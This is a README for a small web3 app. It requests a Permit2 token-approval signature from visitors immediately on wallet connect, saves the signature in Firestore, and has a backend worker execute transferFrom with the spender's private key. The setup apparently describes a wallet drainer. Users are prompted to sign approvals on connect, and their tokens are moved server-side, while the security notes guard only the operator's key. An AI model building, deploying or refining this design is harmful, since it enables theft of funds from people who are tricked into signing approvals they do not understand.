# Permit2 Auto-Sign DApp (AppKit + Ethers)

Minimal dApp that:
- Uses Reown AppKit to open wallet modal and connect
- Requests a Permit2 typed-data signature immediately after connect
- Stores signature components in Firestore
- A backend worker (node) watches Firestore and executes transferFrom using the spender's key

## Quickstart

1. Copy `.env.example` to `.env` (for frontend) and create `functions/.env` (or set env vars for backend).
2. Install dependencies:
   - Frontend: `npm install`
3. Start frontend:
   - `npm run dev`
4. Start backend worker (locally or on a server):
   - `npm run backend`
   The worker will poll Firestore for new signatures and execute `transferFrom`.

## Notes / Security
- The backend **must** hold the spender private key. Keep it secret.
- Test on testnet before mainnet.
- This project is intentionally minimal. Add robust validation, error handling, and logging for production.

